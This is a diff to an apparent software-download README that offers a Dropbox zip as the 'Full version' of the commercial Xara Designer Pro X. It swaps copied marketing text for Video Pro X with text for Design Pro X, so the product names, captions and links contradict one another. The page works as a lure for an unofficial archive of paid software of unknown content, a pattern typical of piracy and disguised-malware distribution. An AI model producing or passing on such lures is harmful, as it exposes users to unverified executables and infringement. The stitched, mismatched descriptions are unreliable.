@@ -11,12 +11,16 @@
 * Disk space - 10 GB free space
 
 ![alt-текст](https://i.imgur.com/uVUrudS.png "Xara Designer Pro X")
-* PROFESSIONAL VIDEO EDITING FOR EVERYONE Video Pro X is the only video editing software that makes professional video production accessible for everyone. With intuitive editing tools and workflows, getting started with Video Pro X is easier than with any other professional video editor. The new video engine allows for seamless, uninterrupted editing of high-resolution 4K Ultra HD material on any PC.
-![alt-текст](https://i.imgur.com/M7eX2vO.png "Xara Designer Pro X")
-* Video Pro X has always stood for technological innovation above and beyond industry standard. 
-* Discover resolutions in up to 8K UltraHD, HDR color space and latest film studio effects, and achieve professional results. The powerful video engine means that video editing is absolutely smooth, even for complex multi-track projects.
+* Desktop publishing Design print and online media to your liking. Quickly and easily prepare brochures, flyers, newspapers and business cards for professional print. Import and export more than 30 file formats and create custom layouts with pictures, graphics and text. Web design Design Pro X makes it possible to create your own responsive website without any prior knowledge. Choose from over 240 website templates to create your very own designs. Intuitive drag-and-drop tools let you easily place pictures, graphics, text, audio and video wherever you want. Photo and graphic design Optimize photos for use online and in print documents. Get the most out of your pictures – with extensive, easy-to-use image editing tools. Or use powerful drawing tools to design your own vector graphics and illustrations for websites and layouts.
+![alt-текст](https://i.imgur.com/b2zlUZI.jpg "Xara Designer Pro X")
+* Desktop publishing for print documents and online documents
+* Precise image editing 
+* Vector-based graphic design Web design – no programming experience required 
+* Search engine optimization
 
-## Download Xara Designeer Pro X [Full version](https://www.dropbox.com/s/563fgau7pi89013/Video%20Pro%20X.zip?dl=1):
+
+
+## Download Xara Designeer Pro X [Full version](https://www.dropbox.com/s/xuwksd0qvnudqwe/Xara%20Designer%20Pro%20X.zip?dl=1):
 
 
 
